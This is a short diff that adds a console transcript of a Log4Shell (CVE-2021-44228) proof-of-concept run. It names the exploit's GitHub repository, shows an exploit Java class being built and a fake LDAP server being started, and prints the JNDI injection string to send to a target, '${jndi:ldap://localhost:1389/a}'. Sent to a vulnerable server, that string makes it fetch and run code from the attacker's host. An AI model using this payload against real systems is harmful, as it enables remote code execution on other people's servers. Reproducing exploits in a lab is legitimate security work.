@@ -1,0 +1,11 @@
+$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+[+] Exploit java class created success
+[+] Setting up fake LDAP server
+
+[+] Send me: ${jndi:ldap://localhost:1389/a}
+
+Listening on 0.0.0.0:1389
